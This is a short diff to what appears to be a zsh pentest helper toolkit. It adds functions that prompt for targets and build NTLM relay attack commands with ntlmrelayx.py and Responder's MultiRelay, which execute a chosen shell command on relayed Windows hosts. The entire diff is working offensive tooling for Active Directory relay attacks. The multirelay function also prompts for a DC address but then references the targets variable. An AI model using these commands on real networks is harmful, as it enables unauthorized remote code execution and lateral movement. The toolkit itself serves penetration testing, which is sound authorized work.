@@ -48,9 +48,17 @@ nb-ad-smb-relay-ntlmrelay-shell() {
 }
 
 nb-ad-smb-relay-ntlmrelay-command() {
+	__ask "Enter a targets list file"
+	__check-targets
 
+	print -z "sudo ntlmrelayx.py -tf ${__TARGETS} -smb2support -c 'whoami'"
 }
 
 nb-ad-smb-relay-multirelay-command() {
+	__ask "Enter the IP address of the target DC server"
+	nb-vars-set-rhost
+	__ask "Enter a shell command to execute"
+	local command && __askvar command COMMAND
 
+	print -z "responder-multirelay -t ${__TARGETS} -c ${command} -u ALL"
 }
